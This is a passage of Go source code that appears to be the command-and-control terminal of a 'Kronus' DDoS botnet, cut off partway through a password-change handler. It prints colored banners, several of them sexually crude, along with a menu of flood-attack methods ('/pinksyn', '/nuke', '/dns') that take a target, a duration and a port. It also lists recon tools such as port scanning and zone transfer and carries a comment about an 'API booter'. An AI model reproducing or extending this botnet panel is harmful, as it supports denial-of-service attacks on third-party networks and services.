            this.conn.Write([]byte("\t\033[37m      \\*/     \t                            \t\033[37m        \\*/     \r\n"))
            this.conn.Write([]byte("\t\033[37m       V      \t                            \t\033[37m         V      \r\n"))
            this.conn.Write([]byte("\t\033[37m      '       \t                            \t\033[37m        '       \r\n"))
            this.conn.Write([]byte("\t\033[37m       ^'     \t                            \t\033[37m         ^'     \r\n"))
            this.conn.Write([]byte("\t\033[37m      (_)     \t                            \t\033[37m        (_)     \r\n"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\t \r\n"))
            continue
        }	 
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 			 
					 if err != nil || cmd == "senpai" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))     
			this.conn.Write([]byte("\033[1;49;35m\r\n"))
			this.conn.Write([]byte("\033[1;49;35m           ███████\x1b[1;36m╗\033[1;49;35m███████\x1b[1;36m╗\033[1;49;35m███\x1b[1;36m╗   \033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██████\x1b[1;36m╗  \033[1;49;35m█████\x1b[1;36m╗ \033[1;49;35m██\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ██\x1b[1;36m╔════╝\033[1;49;35m██\x1b[1;36m╔════╝\033[1;49;35m████\x1b[1;36m╗  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ███████\x1b[1;36m╗\033[1;49;35m█████\x1b[1;36m╗  \033[1;49;35m██\x1b[1;36m╔\033[1;49;35m██\x1b[1;36m╗ \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██████\x1b[1;36m╔╝\033[1;49;35m███████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚════\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔══╝  \033[1;49;35m██\x1b[1;36m║╚\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔═══╝ \033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ███████\x1b[1;36m║\033[1;49;35m███████\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m║ ╚\033[1;49;35m████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║     \033[1;49;35m██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m              \033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\x1b[1;37mようこそ\x1b[1;36m \033[95;1m" + username + " \x1b[1;37mTo Kronus BotNet\033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m               \033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\t \r\n"))     
            continue 
		}	 
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/ 		
					if err != nil || cmd == "daddy" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n")) 
			this.conn.Write([]byte("\033[1;49;35m            [+] \x1b[1;36mDaddy Your So Big 💦 \033[1;49;35m[+]\r\n"))
			this.conn.Write([]byte("\033[1;49;35m\r\n")) 
			this.conn.Write([]byte("\033[1;49;35m\r\n")) 
			this.conn.Write([]byte("\033[1;49;35m          ██████\x1b[1;36m╗  \033[1;49;35m█████\x1b[1;36m╗ \033[1;49;35m██████\x1b[1;36m╗ \033[1;49;35m██████\x1b[1;36m╗ \033[1;49;35m██\x1b[1;36m╗   \033[1;49;35m██\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m          ██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗╚\033[1;49;35m██\x1b[1;36m╗ \033[1;49;35m██\x1b[1;36m╔╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m          ██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m███████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m███\x1b[1;36m║ \033[1;49;35m██\x1b[1;36m║╚\033[1;49;35m██████\x1b[1;36m╔╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m          ██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║  \x1b[1;36m╚\033[1;49;35m██\x1b[1;36m╔╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m          ██████\x1b[1;36m╔╝\033[1;49;35m██\x1b[1;36m║ \033[1;49;35m ██\x1b[1;36m║\033[1;49;35m██████\x1b[1;36m╔╝\033[1;49;35m██████\x1b[1;36m╔╝  \033[1;49;35m ██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m          \x1b[1;36m╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═════╝    ╚═╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m            \033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\x1b[1;37mようこそ\x1b[1;36m \033[95;1m" + username + " \x1b[1;37mTo Daddys BotNet\033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m             \033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\x1b[1;37mヘルプを入力してヘルプを表示する\033[1;49;35m[\x1b[1;37m+\033[1;49;35m]\r\n\x1b[0m"))
            this.conn.Write([]byte("\r\n"))     
            continue 
		}	
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 					 
							 if err != nil || cmd == "anal" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\033[1;49;\r\n\x1b[0m")) 
			this.conn.Write([]byte("\033[1;49;35m          [+]  \x1b[1;36mANAL ONLY DADDY 💦 \033[1;49;35m[+]\r\n\x1b[0m"))
			this.conn.Write([]byte("\033[1;49;35m\r\n\x1b[0m"))
			this.conn.Write([]byte("\033[1;49;35m\r\n\x1b[0m"))
			this.conn.Write([]byte("\033[1;49;35m            █████\x1b[1;36m╗\033[1;49;35m ███\x1b[1;36m╗   \033[1;49;35m██\x1b[1;36m╗ \033[1;49;35m█████\x1b[1;36m╗ \033[1;49;35m██\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m████\x1b[1;36m╗  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ███████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔\033[1;49;35m██\x1b[1;36m╗ \033[1;49;35m██\x1b[1;36m║\033[1;49;35m███████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║╚\x1b[1;36m██\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔══\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           ██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║ \x1b[1;36m╚\033[1;49;35m████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║  \033[1;49;35m██\x1b[1;36m║\033[1;49;35m███████\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m           \x1b[1;36m╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝\r\n\x1b[0m"))
            continue 
		}
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 		 
				 if err != nil || cmd == "fuckme" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\t \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m             [+]   \x1b[1;36mFuck Me Harder Big papi 💦\033[1;49;35m  [+]\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m\r\n\x1b[0m"))
		    this.conn.Write([]byte("\033[1;49;35m             ███████\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m╗  \033[1;49;35m ██\x1b[1;36m╗ \033[1;49;35m██████\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m╗ \033[1;49;35m ██\x1b[1;36m╗    \033[1;49;35m███\x1b[1;36m╗   \033[1;49;35m███\x1b[1;36m╗\033[1;49;35m███████\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m             ██\x1b[1;36m╔════╝\033[1;49;35m██\x1b[1;36m║  \033[1;49;35m ██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔════╝\033[1;49;35m██\x1b[1;36m║ \033[1;49;35m██\x1b[1;36m╔╝    \033[1;49;35m████\x1b[1;36m╗ \033[1;49;35m████\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔════╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m             █████\x1b[1;36m╗  \033[1;49;35m██\x1b[1;36m║   \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║     \033[1;49;35m█████\x1b[1;36m╔╝     \033[1;49;35m██\x1b[1;36m╔\033[1;49;35m████\x1b[1;36m╔\033[1;49;35m██\x1b[1;36m║\033[1;49;35m█████\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m             ██\x1b[1;36m╔══╝  \033[1;49;35m██\x1b[1;36m║   \033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m║     \033[1;49;35m██\x1b[1;36m╔═\033[1;49;35m██\x1b[1;36m╗     \033[1;49;35m██\x1b[1;36m║╚\033[1;49;35m██\x1b[1;36m╔╝\033[1;49;35m██\x1b[1;36m║\033[1;49;35m██\x1b[1;36m╔══╝\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m             ██\x1b[1;36m║     \x1b[1;36m╚\033[1;49;35m██████\x1b[1;36m╔╝╚\033[1;49;35m██████\x1b[1;36m╗\033[1;49;35m██\x1b[1;36m║  \033[1;49;35m█\x1b[1;36m█╗    \033[1;49;35m██\x1b[1;36m║ ╚═╝ \033[1;49;35m██\x1b[1;36m║\033[1;49;35m███████\x1b[1;36m╗\r\n\x1b[0m"))
            this.conn.Write([]byte("\033[1;49;35m             \x1b[1;36m╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚══════╝                                                                                                                 \r\n\x1b[0m"))
            this.conn.Write([]byte("\x1b[1;36m\r\n"))
            this.conn.Write([]byte("\x1b[1;36m                [+]    \033[1;49;35mF u c k   M E    H a r d    D a d d y\x1b[1;36m    [+]\r\n\x1b[0m"))
            this.conn.Write([]byte("\r\n"))     
            continue 
		}
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 			  
					  if err != nil || cmd == "nsfw" || cmd == "NSFW" {
            this.conn.Write([]byte("\033[01;35m            ┌┐┌┌─┐┌─┐┬ ┬                \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m            │││└─┐├┤ │││                \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m            ┘└┘└─┘└  └┴┘                \033[0m \r\n"))
		    this.conn.Write([]byte("\033[01;35m ╔═══════════════════════════════════╗  \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m ║ \033[1;49;32mfuckme -- fuckme banner  😍       \033[01;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[01;35m ║ \033[1;49;32msenpai -- senpai banner  😍       \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║ \033[1;49;32mdaddy --  daddy banner   😍       \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║ \033[1;49;32manal --   anal banner    😍       \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ║ \033[1;49;32mdad --    dad banner     😍       \033[01;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;35m ╚═══════════════════════════════════╝ \033[0m \r\n"))
            continue
        }
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/	
				if err != nil || cmd == "batman" || cmd == "BATMAN" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;34m   MMMMMMMMMMMMMMMMMMMM\x1b[0;31mScreech Out\x1b[0;34mMMMMMMMMMMMMMMMMMMMMM     \r\n"))
            this.conn.Write([]byte("\033[0;34m    `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'       \r\n"))
            this.conn.Write([]byte("\033[0;34m      `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'         \r\n"))
            this.conn.Write([]byte("\033[0;34m        MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM           \r\n"))
            this.conn.Write([]byte("\033[0;34m        .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.           \r\n"))
            this.conn.Write([]byte("\033[0;34m       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM         \r\n"))
            this.conn.Write([]byte("\033[0;34m                      `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                       \r\n"))
            this.conn.Write([]byte("\033[0;34m                             `MMMMMMMMMMMMMMMMMM'                           \r\n"))
            this.conn.Write([]byte("\033[0;34m                                 `MMMMMMMMMM'                                     \r\n"))
            this.conn.Write([]byte("\033[0;34m                                    MMMMMM                                \r\n"))
            this.conn.Write([]byte("\033[0;34m                                     MMMM                                         \r\n"))
            this.conn.Write([]byte("\033[0;34m                                      MM                                         \r\n"))
            continue
        }
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
			  if err != nil || cmd == "katana" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m████████\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \x1b[0;31m███\x1b[0;37m╗   \x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m█████\x1b[0;37m╗ \r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m║ \x1b[0;31m██\x1b[0;37m╔╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗╚══\x1b[0;31m██\x1b[0;37m╔══╝\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m████\x1b[0;37m╗  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m╗\r\n"))
            this.conn.Write([]byte("\033[0;31m     █████\x1b[0;37m╔╝ \x1b[0;31m███████\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m███████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m║\x1b[0;31m███████\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m╔═\x1b[0;31m██\x1b[0;37m╗ \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║╚\x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m╔══\x1b[0;31m██\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     ██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m╗\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║   \x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║ ╚\x1b[0;31m████\x1b[0;37m║\x1b[0;31m██\x1b[0;37m║  \x1b[0;31m██\x1b[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;31m     \x1b[0;37m╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝\r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            this.conn.Write([]byte("\033[0;31m        \r\n"))
            continue
        }
       /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		 if err != nil || cmd == "KRONUS" || cmd == "kronus" {
		this.conn.Write([]byte("\033[1;49;35m    ╔════════════════════════════════╗    \033[0m \r\n"))
		this.conn.Write([]byte("\033[1;49;35m    ║ \033[1;49;32mCUTE 1    CUTE 2    CUTE 3     \033[1;49;35m║    \033[0m \r\n"))
		this.conn.Write([]byte("\033[1;49;35m    ╚════════════════════════════════╝    \033[0m \r\n"))
		this.conn.Write([]byte("\033[1;49;35m    ╔════════════════════════════════╗    \033[0m \r\n"))
		this.conn.Write([]byte("\033[1;49;35m    ║          K R O N U S           ║    \033[0m \r\n"))
		this.conn.Write([]byte("\033[1;49;35m    ╚════════════════════════════════╝    \033[0m \r\n"))
	    continue
        }
		 /*--------------------------------------------------------------------------------------------------------------------------------------------*/ 
		if err != nil || cmd == "CUSTOM" || cmd == "custom" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
			this.conn.Write([]byte("\033[1;49;35m                    ▪▪▪▪▪▪▪▪▪▪▪▪▪[+]Custom METHODS[+]▪▪▪▪▪▪▪▪▪▪▪▪▪▪▪           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                           ▪▪▪▪▪▪▪ ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐ ▪▪▪▪▪▪▪                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                   ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                   ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                        \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                   ╔══════════════════════════════════════════════╗    \033[0m\r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/pinksyn    [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/gta-home   [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/nuke  BETA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/htvac BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/cia   BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/awe   BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/shock BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;32m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/stle  BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;37m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/ruse  BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;37m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/dns   BTEA [\033[01;37mTARGET\033[01;37m] [\033[01;35mtime\033[01;37m] dport=[\033[01;35mport\033[01;37m]\033[01;37m     \033[1;49;32m║   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                   ╚══════════════════════════════════════════════╝   \033[0m \r\n"))
			continue
        }
       /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		                if err != nil || cmd == "account" || cmd == "ACCOUNT" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                         ╦╔═ ╦═╗ ╔═╗ ╦═╗ ╦ ╦ ╔═╗\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                         ╠╩╗ ╟╦╝ ║ ║ ║ ║ ║ ║ ╚═╗\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                         ╩ ╩ ╩╚═ ╚═╝ ╩ ╩ ╚═╝ ╚═╝\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ╔═══════════════════════════════════════════════╗\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ║          ACCOUNT MANAGEMENT MUNU              ║\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ╚═══════════════════════════════════════════════╝\x1b[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ╔═══════════════════════════════════════════════╗\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║ \033[1;49;32mPASSWD : Change Account Password              \033[1;49;35m║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║                                               ║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║                                               ║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║                                               ║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║                                               ║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║                                               ║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ║                                               ║\x1b[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m            ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n"))
            continue
		}
		if err != nil || cmd == "TOOLS" || cmd == "tools" {
            this.conn.Write([]byte("\033[1;49;35m                                                                                  \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                                                                                  \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                             ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                                   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                             ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                                   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                             ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                                   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                   ╔═══════════════════════════════════╗                          \033[1;49;35m\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/ping - Ping an\033[1;49;32m IPv4              \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/iplookup - Loo\033[1;49;32mkup IPv4           \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/portscan - Por\033[1;49;32mtscan IPv4         \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/resolve - Reso\033[1;49;32mlve a URL          \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/reversedns - F\033[1;49;32mind DNS of an IPv4 \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/asnlookup - Fi\033[1;49;32mnd ASN of an IPv4  \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/traceroute - T\033[1;49;32mraceroute On IPv4  \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/subnetcalc - C\033[1;49;32malculate A Subnet  \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/whois - WHOIS \033[1;49;32mSearch             \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ║ \033[1;49;35m/zonetransfer -\033[1;49;32m Shows ZT          \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                   ╚════════════════\033[1;49;32m═══════════════════╝                          \033[0m \r\n"))
            continue
        }
        ///////////////////////// END OF API BOOTER
        ///////////////////////// anti crash
        if strings.Contains(cmd, "@") {
            continue
        }
        ///////////////////////// END OF API BOOTER
           		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		args := strings.Split(cmd, " ")
		switch strings.ToLower(args[0]) {
		case "passwd":

			fmt.Fprint(this.conn, "                                \033[1;49;35m║\033[1;49;32mCurrent Password\033[0m: ")
			currentPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}

			if currentPassword != password {
				fmt.Fprintln(this.conn, "                                \033[1;49;35m║\033[31mIncorrect Password!\r")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[1;49;35m║\033[00;1;95mNew Password\033[0m: ")
			newPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}

			fmt.Fprint(this.conn, "                                \033[1;49;35m║\033[1;49;32mConfirm Password\033[0m: ")
			confirmPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}

			if len(newPassword) < 6 {
				fmt.Fprintln(this.conn, "                                \033[1;49;35m║\033[31mYour Password Is Not Secure!\033[0m\r")
				continue
			}

			if confirmPassword != newPassword {
				fmt.Fprintln(this.conn, "                                \033[1;49;35m║\033[31mYour Passwords Do Not Match!\033[0m\r")
				continue
			}

			if database.ChangeUsersPassword(username, newPassword) == false {
				fmt.Fprintln(this.conn, "                                \033[1;49;35m║\033[31mFailed To Chnaged Password!\033[0m\r")
				continue
			}

